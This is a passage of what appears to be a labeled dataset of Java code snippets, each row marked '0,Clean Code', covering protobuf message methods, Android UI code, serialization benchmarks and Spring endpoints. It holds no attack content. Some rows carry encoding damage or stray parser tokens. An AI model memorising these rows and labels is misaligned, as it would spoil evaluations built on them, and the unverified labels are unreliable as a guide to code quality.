    if (!getFeatureDomain().equals(other.getFeatureDomain()))     return false;
  }
  if (hasOutputDomain() != other.hasOutputDomain())   return false;
  if (hasOutputDomain()) {
    if (!getOutputDomain().equals(other.getOutputDomain()))     return false;
  }
  if (getSize() != other.getSize())   return false;
  if (!getIndicesList().equals(other.getIndicesList()))   return false;
  if (getSeed() != other.getSeed())   return false;
  if (!getTag().equals(other.getTag()))   return false;
  if (getSampled() != other.getSampled())   return false;
  if (getWeighted() != other.getWeighted())   return false;
  if (getStoreIndices() != other.getStoreIndices())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Specialization protected boolean evalFloatFloat(double self,double start,double inclusiveEnd){
  return self >= start && self <= inclusiveEnd;
}
",0,Clean Code
"private MessageWindowChatMemory(Builder builder){
  this.id=ensureNotNull(builder.id,""id"");
  this.maxMessages=ensureGreaterThanZero(builder.maxMessages,""maxMessages"");
  this.store=ensureNotNull(builder.store,""store"");
}
",0,Clean Code
"public SortedMapContainer(Comparator<K> comparator,int capacity){
  super(capacity);
  this.comparator=comparator;
}
",0,Clean Code
"/** 
 * <code>optional uint32 plane_id = 6;</code>
 * @param value the planeId to set
 * @return this
 */
public QuitLineupCsReq setPlaneId(final int value){
  bitField0_|=0x00000001;
  planeId=value;
  return this;
}",0,Clean Code
"public GProMsgRouttingHead(){
}
public GProMsgRouttingHead(long j2,long j3,long j4,long j5,long j6,int i2){
  this.guildId=j2;
  this.channelId=j3;
  this.fromUin=j4;
  this.fromTinyid=j5;
  this.guildCode=j6;
  this.directMsgFlag=i2;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockModelProto other=(org.tribuo.test.protos.MockModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getConstantOutput().equals(other.getConstantOutput()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public void handleTransportError(@NotNull WebSocketSession session,@NotNull Throwable e) throws Exception {
  log.error(""[wss-{}] Transport error"",this.account.getDisplay(),e);
  onFailure(CLOSE_CODE_EXCEPTION,""transport error"");
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code SyncRogueCommonActionResultScNotify}
 */
public static SyncRogueCommonActionResultScNotify newInstance(){
  return new SyncRogueCommonActionResultScNotify();
}
",0,Clean Code
"@Override protected ResponseEntity<ChatCompletion> doChatCompletion(ChatCompletionRequest request){
  return this.openAiApi.chatCompletionEntity(request);
}
",0,Clean Code
"private static String toFlagsString(final int flags){
  final ArrayList<String> flagsArray=new ArrayList<>();
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS))   flagsArray.add(""TYPE_TEXT_FLAG_NO_SUGGESTIONS"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_MULTI_LINE))   flagsArray.add(""TYPE_TEXT_FLAG_MULTI_LINE"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_IME_MULTI_LINE))   flagsArray.add(""TYPE_TEXT_FLAG_IME_MULTI_LINE"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_CAP_WORDS))   flagsArray.add(""TYPE_TEXT_FLAG_CAP_WORDS"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_CAP_SENTENCES))   flagsArray.add(""TYPE_TEXT_FLAG_CAP_SENTENCES"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS))   flagsArray.add(""TYPE_TEXT_FLAG_CAP_CHARACTERS"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_AUTO_CORRECT))   flagsArray.add(""TYPE_TEXT_FLAG_AUTO_CORRECT"");
  if (0 != (flags & InputType.TYPE_TEXT_FLAG_AUTO_COMPLETE))   flagsArray.add(""TYPE_TEXT_FLAG_AUTO_COMPLETE"");
  return flagsArray.isEmpty() ? """" : Arrays.toString(flagsArray.toArray());
}",0,Clean Code
"public int getAccessFlag(){
  return this.accessFlag;
}
",0,Clean Code
"public void treatObject(DataOutputStream out,Object obj,HandleContainer handles,boolean blockData) throws Exception {
  if (blockData) {
    if (this.blockData == null)     this.blockData=new TCBlockData();
    this.blockData.append(obj);
    return;
  }
  writeBlockData(out,handles);
  if (obj instanceof Byte) {
    out.writeByte(((Byte)obj).byteValue());
  }
 else   if (obj instanceof Short) {
    out.writeShort(((Short)obj).shortValue());
  }
 else   if (obj instanceof Integer) {
    out.writeInt(((Integer)obj).intValue());
  }
 else   if (obj instanceof Long) {
    out.writeLong(((Long)obj).longValue());
  }
 else   if (obj instanceof Float) {
    out.writeFloat(((Float)obj).floatValue());
  }
 else   if (obj instanceof Double) {
    out.writeDouble(((Double)obj).doubleValue());
  }
 else   if (obj instanceof Character) {
    out.writeChar(((Character)obj).charValue());
  }
 else   if (obj instanceof String || obj instanceof TCString) {
    TCString s=(obj instanceof TCString) ? (TCString)obj : TCString.getInstance(obj.toString());
    s.write(out,handles);
  }
 else   if (obj instanceof TCObject) {
    TCObject o=(TCObject)obj;
    o.write(out,handles);
  }
 else {
    ByteArrayOutputStream byteout=new ByteArrayOutputStream();
    ObjectOutputStream objout=getPatchedOutputStream(byteout);
    TCJavaObject o=new TCJavaObject(obj,byteout,objout);
    o.write(out,handles);
  }
}
",0,Clean Code
"public String toString(){
  return ""TransGroupFileResult{result="" + this.result + "",saveBusId=""+ this.saveBusId+ "",saveFilePath=""+ this.saveFilePath+ "",}"";
}
",0,Clean Code
"public void invalidateTransforms(){
  invalidateTransforms(true);
}
public void invalidateTransforms(boolean applyBackScaleY){
  if (lastToProgress != toProgress || lastTransitionProgress != transitionProgress) {
    if (!onSwipeBackProgressListeners.isEmpty()) {
      for (int i=0; i < onSwipeBackProgressListeners.size(); i++) {
        onSwipeBackProgressListeners.get(i).onSwipeBackProgress(this,toProgress,transitionProgress);
      }
    }
    lastToProgress=toProgress;
    lastTransitionProgress=transitionProgress;
  }
  View backgroundView=getChildAt(0);
  View foregroundView=null;
  if (currentForegroundIndex >= 0 && currentForegroundIndex < getChildCount()) {
    foregroundView=getChildAt(currentForegroundIndex);
  }
  backgroundView.setTranslationX(-transitionProgress * getWidth() * 0.5f);
  float bSc=0.95f + (1f - transitionProgress) * 0.05f;
  backgroundView.setScaleX(bSc);
  backgroundView.setScaleY(bSc);
  if (foregroundView != null) {
    foregroundView.setTranslationX((1f - transitionProgress) * getWidth());
  }
  invalidateVisibility();
  float fW=backgroundView.getMeasuredWidth(), fH=backgroundView.getMeasuredHeight();
  float tW=0;
  float tH=0;
  if (foregroundView != null) {
    tW=foregroundView.getMeasuredWidth();
    tH=overrideForegroundHeight != 0 ? overrideForegroundHeight : foregroundView.getMeasuredHeight();
  }
  if (backgroundView.getMeasuredWidth() == 0 || backgroundView.getMeasuredHeight() == 0) {
    return;
  }
  ActionBarPopupWindow.ActionBarPopupWindowLayout p=(ActionBarPopupWindow.ActionBarPopupWindowLayout)getParent();
  float w=fW + (tW - fW) * transitionProgress;
  float h=fH + (tH - fH) * transitionProgress;
  w+=p.getPaddingLeft() + p.getPaddingRight();
  h+=p.getPaddingTop() + p.getPaddingBottom();
  p.updateAnimation=false;
  p.setBackScaleX(w / p.getMeasuredWidth());
  if (applyBackScaleY) {
    p.setBackScaleY(h / p.getMeasuredHeight());
  }
  p.updateAnimation=true;
  for (int i=0; i < getChildCount(); i++) {
    View ch=getChildAt(i);
    ch.setPivotX(0);
    ch.setPivotY(0);
  }
  invalidate();
}",0,Clean Code
"public final int getStartIndex(){
  return startIndex;
}
",0,Clean Code
"public void setBackgroundImage(Drawable bitmap,boolean motion){
  if (backgroundDrawable == bitmap) {
    return;
  }
  if (bitmap instanceof MotionBackgroundDrawable) {
    MotionBackgroundDrawable motionBackgroundDrawable=(MotionBackgroundDrawable)bitmap;
    motionBackgroundDrawable.setParentView(backgroundView);
  }
  backgroundDrawable=bitmap;
  if (motion) {
    if (parallaxEffect == null) {
      parallaxEffect=new WallpaperParallaxEffect(getContext());
      parallaxEffect.setCallback((offsetX,offsetY,angle) -> {
        translationX=offsetX;
        translationY=offsetY;
        bgAngle=angle;
        backgroundView.invalidate();
      }
);
      if (getMeasuredWidth() != 0 && getMeasuredHeight() != 0) {
        parallaxScale=parallaxEffect.getScale(getMeasuredWidth(),getMeasuredHeight());
      }
    }
    if (!paused) {
      parallaxEffect.setEnabled(true);
    }
  }
 else   if (parallaxEffect != null) {
    parallaxEffect.setEnabled(false);
    parallaxEffect=null;
    parallaxScale=1.0f;
    translationX=0;
    translationY=0;
  }
  backgroundView.invalidate();
  checkLayerType();
}",0,Clean Code
"/** 
 * Returns the canonical name of the underlying class as defined by <cite>The Java Language Specification</cite>. Throw  {@link IllegalArgumentException} if the underlying class does nothave a canonical name(i.e., if it is a local or anonymous class or an array whose component type does not have a canonical name).
 * @throws IllegalArgumentException if the canonical name of the underlying class doesn't exist.
 */
public static String getCanonicalName(Class<?> cls){
  String canonicalName=cls.getCanonicalName();
  org.apache.fury.util.Preconditions.checkArgument(canonicalName != null,""Class %s doesn't have canonical name"",cls);
  return canonicalName;
}
",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  if (waitingImage) {
    if (imageReceiver != null && imageReceiver.getBitmap() != null) {
      waitingImage=false;
      setColor(AndroidUtilities.getDominantColor(imageReceiver.getBitmap()));
    }
 else     if (emojiDrawable != null) {
      int color=AnimatedEmojiDrawable.getDominantColor(emojiDrawable);
      if (color != 0) {
        waitingImage=false;
        setColor(color);
      }
 else {
        invalidate();
      }
    }
 else {
      invalidate();
    }
  }
  if (paint != null) {
    if (type == TYPE_REACTIONS) {
      if (currentColor != 0) {
        canvas.drawPath(path,paint);
      }
 else {
        PremiumGradient.getInstance().updateMainGradientMatrix(0,0,getMeasuredWidth(),getMeasuredHeight(),-AndroidUtilities.dp(24),0);
        canvas.drawPath(path,PremiumGradient.getInstance().getMainGradientPaint());
      }
      if (cellFlickerDrawable == null) {
        cellFlickerDrawable=new CellFlickerDrawable();
      }
      cellFlickerDrawable.setParentWidth(getMeasuredWidth() / 2);
      cellFlickerDrawable.drawFrame=false;
      cellFlickerDrawable.draw(canvas,path,this);
      canvas.save();
      canvas.clipPath(path);
      starParticles.onDraw(canvas);
      canvas.restore();
      invalidate();
    }
 else {
      float cx=getMeasuredWidth() / 2f;
      float cy=getMeasuredHeight() / 2f;
      if (oldShaderPaint == null) {
        shaderCrossfadeProgress=1f;
      }
      if (shaderCrossfadeProgress != 1f) {
        paint.setAlpha((int)(255 * shaderCrossfadeProgress));
        canvas.drawCircle(cx,cy,cx,oldShaderPaint);
        canvas.drawCircle(cx,cy,cx,paint);
        shaderCrossfadeProgress+=16 / 150f;
        if (shaderCrossfadeProgress > 1f) {
          shaderCrossfadeProgress=1f;
          oldShaderPaint=null;
        }
        invalidate();
        paint.setAlpha(255);
      }
 else {
        canvas.drawCircle(cx,cy,cx,paint);
      }
    }
  }
  super.onDraw(canvas);
  wasDrawn=true;
}",0,Clean Code
"/** 
 * Split the text containing multiple key specifications separated by commas into an array of key specifications. A key specification can contain a character escaped by the backslash character, including a comma character. Note that an empty key specification will be eliminated from the result array.
 * @param text the text containing multiple key specifications.
 * @return an array of key specification text. Null if the specified <code>text</code> is emptyor has no key specifications.
 */
@Nullable public static String[] splitKeySpecs(@Nullable final String text){
  if (TextUtils.isEmpty(text)) {
    return null;
  }
  final int size=text.length();
  if (size == 1) {
    return text.charAt(0) == COMMA ? null : new String[]{text};
  }
  ArrayList<String> list=null;
  int start=0;
  for (int pos=0; pos < size; pos++) {
    final char c=text.charAt(pos);
    if (c == COMMA) {
      if (pos - start > 0) {
        if (list == null) {
          list=new ArrayList<>();
        }
        list.add(text.substring(start,pos));
      }
      start=pos + 1;
    }
 else     if (c == BACKSLASH) {
      pos++;
    }
  }
  final String remain=(size - start > 0) ? text.substring(start) : null;
  if (list == null) {
    return remain != null ? new String[]{remain} : null;
  }
  if (remain != null) {
    list.add(remain);
  }
  return list.toArray(new String[0]);
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)98);
    output.writeMessageNoTag(diceInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.diceInfo,diceInfo);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * <code>optional uint64 taken_free_extended_reward = 3;</code>
 * @return whether the takenFreeExtendedReward field is set
 */
public boolean hasTakenFreeExtendedReward(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public void setup(){
  super.setup();
  buffer=new LongStringSerializationSuite().fst_serializeLongStr(this,null);
}
@Override public void setup(){
  super.setup();
  new LongStringSerializationSuite().fury_serializeLongStr(this);
}
@Override public void setup(){
  super.setup();
  bis=new ByteArrayInputStream(new LongStringSerializationSuite().hession_serializeLongStr(this).toByteArray());
  input=new Hessian2Input(bis);
}
@Override public void setup(){
  super.setup();
  bis=new ByteArrayInputStream(new LongStringSerializationSuite().jdk_serializeLongStr(this).toByteArray());
}
@Override public void setup(){
  super.setup();
  new LongStringSerializationSuite().kryo_serializeLongStr(this);
}
@Override public void setup(){
  super.setup();
  schema=RuntimeSchema.getSchema(data.longStr.getClass());
  protoStuff=new LongStringSerializationSuite().protostuff_serializeLongStr(this);
  Preconditions.checkArgument(ProtostuffState.deserialize(schema,protoStuff).equals(data.longStr));
}",0,Clean Code
"public boolean isSorting(){
  return sortingColumns.size() != 0;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var proto=HandleRogueCommonPendingActionCsReq.parseFrom(data);
  if (proto.hasBuffSelectResult()) {
    session.getPlayer().getRogueInstance().selectBuff(proto.getBuffSelectResult().getBuffId());
  }
 else   if (proto.hasMiracleSelectResult()) {
    session.getPlayer().getRogueInstance().selectMiracle(proto.getMiracleSelectResult().getMiracleId());
  }
 else   if (proto.hasBonusSelectResult()) {
    session.getPlayer().getRogueInstance().selectBonus(proto.getBonusSelectResult().getBonusId());
  }
 else   if (proto.hasRollBuff()) {
    session.getPlayer().getRogueInstance().rollBuffSelect();
  }
}
",0,Clean Code
"/** 
 * Usage statistics for the completion request.
 * @param completionTokens Number of tokens in the generated completion. Only applicable for completion requests.
 * @param promptTokens Number of tokens in the prompt.
 * @param totalTokens Total number of tokens used in the request (prompt + completion).
 */
@JsonInclude(Include.NON_NULL) public record Usage(@JsonProperty(""completion_tokens"") Integer completionTokens,@JsonProperty(""prompt_tokens"") Integer promptTokens,@JsonProperty(""total_tokens"") Integer totalTokens){
}
",0,Clean Code
"public static VmClass getFunction4Class(){
  return Function4Class.instance;
}",0,Clean Code
"public BitSet parse(String token){
  if (this.fieldType == CronFieldType.DAY_OF_WEEK) {
    if (token.length() == 2 && token.endsWith(""l"")) {
      return this.parseLiteral(token.substring(0,1));
    }
  }
 else   if (this.fieldType == CronFieldType.DAY && ""l"".equals(token)) {
    return fieldType.parseLastDayOfMonth();
  }
  if (token.indexOf(',') > -1) {
    BitSet bitSet=new BitSet(this.length);
    String[] items=token.split("","");
    for (    String item : items) {
      bitSet.or(this.parse(item));
    }
    return bitSet;
  }
  if (token.indexOf('/') > -1)   return this.parseStep(token);
  if (token.indexOf('-') > -1)   return this.parseRange(token);
  if (token.equalsIgnoreCase(""*"")) {
    return fieldType.parseAsterisk();
  }
  return this.parseLiteral(token);
}",0,Clean Code
"/** 
 * @return factory for creating SelectRogueDialogueEventCsReq messages
 */
public static MessageFactory<SelectRogueDialogueEventCsReq> getFactory(){
  return SelectRogueDialogueEventCsReqFactory.INSTANCE;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.NeighbourFactoryProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.NeighbourFactoryProto other=(org.tribuo.math.protos.NeighbourFactoryProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public DestroyItemCsReq copyFrom(final DestroyItemCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    itemId=other.itemId;
    itemCount=other.itemCount;
    curItemCount=other.curItemCount;
  }
  return this;
}",0,Clean Code
"public String readString(MemoryBuffer buffer){
  if (isJava) {
    return readJavaString(buffer);
  }
 else {
    return readUTF8String(buffer);
  }
}",0,Clean Code
"/** 
 * <code>repeated .TextJoinInfo text_join_list = 2;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<TextJoinInfoOuterClass.TextJoinInfo> getMutableTextJoinList(){
  bitField0_|=0x00000002;
  return textJoinList;
}",0,Clean Code
"public List<List<Integer>> levelOrder(TreeNode root){
  Deque<TreeNode> deque=new LinkedList<>();
  List<List<Integer>> res=new ArrayList<>();
  if (root != null)   deque.add(root);
  while (!deque.isEmpty()) {
    List<Integer> tmp=new ArrayList<>();
    for (int i=deque.size(); i > 0; i--) {
      TreeNode node=deque.removeFirst();
      tmp.add(node.val);
      if (node.left != null)       deque.addLast(node.left);
      if (node.right != null)       deque.addLast(node.right);
    }
    res.add(tmp);
    if (deque.isEmpty())     break;
    tmp=new ArrayList<>();
    for (int i=deque.size(); i > 0; i--) {
      TreeNode node=deque.removeLast();
      tmp.add(node.val);
      if (node.right != null)       deque.addFirst(node.right);
      if (node.left != null)       deque.addFirst(node.left);
    }
    res.add(tmp);
  }
  return res;
}",0,Clean Code
"@PostMapping(""/deleteSlipTemplate/{templateId}"") @ApiOperation(""鍒犻櫎宸ヨ祫鏉℃ā鏉�"") public Result deleteSlipTemplate(@PathVariable(""templateId"") Long templateId){
  salarySlipTemplateService.deleteSlipTemplate(templateId);
  return Result.ok();
}
",0,Clean Code
"@Override public void writeUTF(String s) throws IOException {
  Preconditions.checkNotNull(s);
  fury.writeJavaString(buffer,s);
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 4;</code>
 * @return whether the lineup field is set
 */
public boolean hasLineup(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public long longValue(){
  return get();
}
",0,Clean Code
"/** 
 * @return factory for creating RevcMsgScNotify messages
 */
public static MessageFactory<RevcMsgScNotify> getFactory(){
  return RevcMsgScNotifyFactory.INSTANCE;
}
",0,Clean Code
"@Override protected Object convertValue(Object value,String type) throws DataValueConvertionException {
  if (value == null)   return null;
  if (type == null)   return value;
  try {
    if (value instanceof String)     return convertStringValue((String)value,type);
 else     if (value instanceof Boolean)     return convertBooleanValue((Boolean)value,type);
 else     if (value instanceof Number)     return convertNumberValue((Number)value,type);
 else     if (value instanceof Time)     return convertTimeValue((Time)value,type);
 else     if (value instanceof Timestamp)     return convertTimestampValue((Timestamp)value,type);
 else     if (value instanceof java.util.Date)     return convertDateValue((java.util.Date)value,type);
 else {
      if (DataType.UNKNOWN.equals(type))       return value;
 else       throw new DataValueConvertionException(value,type);
    }
  }
 catch (  DataValueConvertionException e) {
    throw e;
  }
catch (  Throwable t) {
    throw new DataValueConvertionException(value,type);
  }
}
",0,Clean Code
"@Override public void onPlaybackStateChanged(PlaybackStateCompat state){
  if (mIsBuffering && state.getState() != PlaybackStateCompat.STATE_BUFFERING) {
    getCallback().onBufferingStateChanged(MediaControllerAdapter.this,false);
    getCallback().onBufferedPositionChanged(MediaControllerAdapter.this);
    mIsBuffering=false;
  }
  if (state.getState() == PlaybackStateCompat.STATE_NONE) {
    if (DEBUG) {
      Log.d(TAG,""Playback state is none"");
    }
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_STOPPED) {
    getCallback().onPlayCompleted(MediaControllerAdapter.this);
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_PAUSED) {
    getCallback().onPlayStateChanged(MediaControllerAdapter.this);
    getCallback().onCurrentPositionChanged(MediaControllerAdapter.this);
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_PLAYING) {
    getCallback().onPlayStateChanged(MediaControllerAdapter.this);
    getCallback().onCurrentPositionChanged(MediaControllerAdapter.this);
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_BUFFERING) {
    mIsBuffering=true;
    getCallback().onBufferingStateChanged(MediaControllerAdapter.this,true);
    getCallback().onBufferedPositionChanged(MediaControllerAdapter.this);
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_ERROR) {
    CharSequence errorMessage=state.getErrorMessage();
    if (errorMessage == null) {
      getCallback().onError(MediaControllerAdapter.this,state.getErrorCode(),"""");
    }
 else {
      getCallback().onError(MediaControllerAdapter.this,state.getErrorCode(),state.getErrorMessage().toString());
    }
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_FAST_FORWARDING) {
    getCallback().onPlayStateChanged(MediaControllerAdapter.this);
    getCallback().onCurrentPositionChanged(MediaControllerAdapter.this);
  }
 else   if (state.getState() == PlaybackStateCompat.STATE_REWINDING) {
    getCallback().onPlayStateChanged(MediaControllerAdapter.this);
    getCallback().onCurrentPositionChanged(MediaControllerAdapter.this);
  }
}
",0,Clean Code
"public ReturnConstant(XSharedPreferences prefs,String prefsKey,Object value){
  this.prefs=prefs;
  this.prefsKey=prefsKey;
  this.value=value;
}
",0,Clean Code
"private UserTimeLineVo buildUserTimeLineVo(List<SimpleAnchorInfo> sortAnchorList){
  Map<String,List<SimpleAnchorInfo>> map=MapUtil.newHashMap();
  for (  SimpleAnchorInfo simpleAnchorInfo : sortAnchorList) {
    List<SimpleAnchorInfo> simpleAnchorInfos=map.get(String.valueOf(simpleAnchorInfo.getBusinessId()));
    if (CollUtil.isEmpty(simpleAnchorInfos)) {
      simpleAnchorInfos=new ArrayList<>();
    }
    simpleAnchorInfos.add(simpleAnchorInfo);
    map.put(String.valueOf(simpleAnchorInfo.getBusinessId()),simpleAnchorInfos);
  }
  List<UserTimeLineVo.ItemsVO> items=new ArrayList<>();
  for (  Map.Entry<String,List<SimpleAnchorInfo>> entry : map.entrySet()) {
    Long messageTemplateId=TaskInfoUtils.getMessageTemplateIdFromBusinessId(Long.valueOf(entry.getKey()));
    MessageTemplate messageTemplate=messageTemplateDao.findById(messageTemplateId).orElse(null);
    if (Objects.isNull(messageTemplate)) {
      continue;
    }
    StringBuilder sb=new StringBuilder();
    for (    SimpleAnchorInfo simpleAnchorInfo : entry.getValue()) {
      if (AnchorState.RECEIVE.getCode().equals(simpleAnchorInfo.getState())) {
        sb.append(StrPool.CRLF);
      }
      String startTime=DateUtil.format(new Date(simpleAnchorInfo.getTimestamp()),DatePattern.NORM_DATETIME_PATTERN);
      String stateDescription=AnchorStateUtils.getDescriptionByState(messageTemplate.getSendChannel(),simpleAnchorInfo.getState());
      sb.append(startTime).append(StrPool.C_COLON).append(stateDescription).append(""==>"");
    }
    for (    String detail : sb.toString().split(StrPool.CRLF)) {
      if (CharSequenceUtil.isNotBlank(detail)) {
        UserTimeLineVo.ItemsVO itemsVO=UserTimeLineVo.ItemsVO.builder().businessId(entry.getKey()).sendType(EnumUtil.getEnumByCode(messageTemplate.getSendChannel(),ChannelType.class).getDescription()).creator(messageTemplate.getCreator()).title(messageTemplate.getName()).detail(detail).build();
        items.add(itemsVO);
      }
    }
  }
  return UserTimeLineVo.builder().items(items).build();
}
",0,Clean Code
"byte[] getMaxBytesReadMsgMeta();
",0,Clean Code
"@Override public GetCurSceneInfoScRsp create(){
  return GetCurSceneInfoScRsp.newInstance();
}
",0,Clean Code
"private CategoricalIDInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CategoricalIDInfoProto(){
  name_="""";
  key_=emptyDoubleList();
  value_=emptyLongList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1303bbea",0,Clean Code
"@Benchmark public Object fury_serialize(FuryState state){
  state.bufferObjects.clear();
  state.buffer.writerIndex(0);
  state.fury.serialize(state.buffer,state.data,o -> {
    state.bufferObjects.add(o);
    return false;
  }
);
  return state.buffer;
}",0,Clean Code
"@PostConstruct public void init(){
  configService=sysConfigService;
}
",0,Clean Code
"@Override public void init() throws NoSuchMethodException {
  hookAllMethods(""com.android.phone.NetworkModeManager"",""isRemoveNetworkModeSettings"",new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      param.setResult(false);
    }
  }
);
}
",0,Clean Code
"/** 
 * Front-end template settings
 * @return
 */
@GetMapping(value={""/"",""/web/"",""/web/**"",""/login"",""/workspace"",""/dashboard"",""/connections"",""/team""}) public String index(){
  return ""index"";
}
",0,Clean Code
"protected ElasticSearchIndexMetadata convertMetadata(String index,MappingMetadata metadata){
  MappingMetadata mappingMetadata;
  Object properties=null;
  Map<String,Object> metaData=metadata.getSourceAsMap();
  if (metaData.containsKey(""properties"")) {
    Object res=metaData.get(""properties"");
    if (res instanceof Map) {
      properties=res;
    }
 else     if (res instanceof MappingMetadata) {
      mappingMetadata=((MappingMetadata)res);
      properties=mappingMetadata.sourceAsMap();
    }
 else     if (res instanceof CompressedXContent) {
      mappingMetadata=new MappingMetadata(((CompressedXContent)res));
      properties=mappingMetadata.sourceAsMap();
    }
 else {
      throw new UnsupportedOperationException(""unsupported index metadata"" + metaData);
    }
  }
 else {
    Object res=metaData.get(""_doc"");
    if (res instanceof MappingMetadata) {
      mappingMetadata=((MappingMetadata)res);
    }
 else     if (res instanceof CompressedXContent) {
      mappingMetadata=new MappingMetadata(((CompressedXContent)res));
    }
 else {
      throw new UnsupportedOperationException(""unsupported index metadata"" + metaData);
    }
    properties=mappingMetadata.getSourceAsMap().get(""properties"");
  }
  if (properties == null) {
    throw new UnsupportedOperationException(""unsupported index metadata"" + metaData);
  }
  return new DefaultElasticSearchIndexMetadata(index,convertProperties(properties));
}
",0,Clean Code
"/** 
 * Invokes the given visitor's visit method for this  {@code Value}. 
 */
void accept(ValueVisitor visitor);
/** 
 * Invokes the given converters's convert method for this  {@code Value}. 
 */
<T>T accept(ValueConverter<T> converter);
",0,Clean Code
"private int getLedColor(){
  int color=0xff0000ff;
switch (currentType) {
case TYPE_PRIVATE:
    color=getNotificationsSettings().getInt(""MessagesLed"",color);
  break;
case TYPE_GROUP:
color=getNotificationsSettings().getInt(""GroupLed"",color);
break;
case TYPE_STORIES:
color=getNotificationsSettings().getInt(""StoriesLed"",color);
break;
case TYPE_CHANNEL:
color=getNotificationsSettings().getInt(""ChannelLed"",color);
break;
case TYPE_REACTIONS_MESSAGES:
case TYPE_REACTIONS_STORIES:
color=getNotificationsSettings().getInt(""ReactionsLed"",color);
break;
}
for (int a=0; a < 9; a++) {
if (TextColorCell.colorsToSave[a] == color) {
color=TextColorCell.colors[a];
break;
}
}
return color;
}",0,Clean Code
"private static long parseInteger(String text,boolean isSigned,boolean isLong) throws NumberFormatException {
  int pos=0;
  boolean negative=false;
  if (text.startsWith(""-"",pos)) {
    if (!isSigned) {
      throw new NumberFormatException(""Number must be positive: "" + text);
    }
    ++pos;
    negative=true;
  }
  int radix=10;
  if (text.startsWith(""0x"",pos)) {
    pos+=2;
    radix=16;
  }
 else   if (text.startsWith(""0"",pos)) {
    radix=8;
  }
  String numberText=text.substring(pos);
  long result=0;
  if (numberText.length() < 16) {
    result=Long.parseLong(numberText,radix);
    if (negative) {
      result=-result;
    }
    if (!isLong) {
      if (isSigned) {
        if ((result > Integer.MAX_VALUE) || (result < Integer.MIN_VALUE)) {
          throw new NumberFormatException(""Number out of range for 32-bit signed integer: "" + text);
        }
      }
 else {
        if ((result >= (1L << 32)) || (result < 0)) {
          throw new NumberFormatException(""Number out of range for 32-bit unsigned integer: "" + text);
        }
      }
    }
  }
 else {
    BigInteger bigValue=new BigInteger(numberText,radix);
    if (negative) {
      bigValue=bigValue.negate();
    }
    if (!isLong) {
      if (isSigned) {
        if (bigValue.bitLength() > 31) {
          throw new NumberFormatException(""Number out of range for 32-bit signed integer: "" + text);
        }
      }
 else {
        if (bigValue.bitLength() > 32) {
          throw new NumberFormatException(""Number out of range for 32-bit unsigned integer: "" + text);
        }
      }
    }
 else {
      if (isSigned) {
        if (bigValue.bitLength() > 63) {
          throw new NumberFormatException(""Number out of range for 64-bit signed integer: "" + text);
        }
      }
 else {
        if (bigValue.bitLength() > 64) {
          throw new NumberFormatException(""Number out of range for 64-bit unsigned integer: "" + text);
        }
      }
    }
    result=bigValue.longValue();
  }
  return result;
}",0,Clean Code
"public SchemaMetadataTransform(String primaryKeyString,String partitionKeyString,String tableOptionString){
  if (!StringUtils.isNullOrWhitespaceOnly(primaryKeyString)) {
    String[] primaryKeyArr=primaryKeyString.split("","");
    for (int i=0; i < primaryKeyArr.length; i++) {
      primaryKeyArr[i]=primaryKeyArr[i].trim();
    }
    primaryKeys=Arrays.asList(primaryKeyArr);
  }
  if (!StringUtils.isNullOrWhitespaceOnly(partitionKeyString)) {
    String[] partitionKeyArr=partitionKeyString.split("","");
    for (int i=0; i < partitionKeyArr.length; i++) {
      partitionKeyArr[i]=partitionKeyArr[i].trim();
    }
    partitionKeys=Arrays.asList(partitionKeyArr);
  }
  if (!StringUtils.isNullOrWhitespaceOnly(tableOptionString)) {
    for (    String tableOption : tableOptionString.split("","")) {
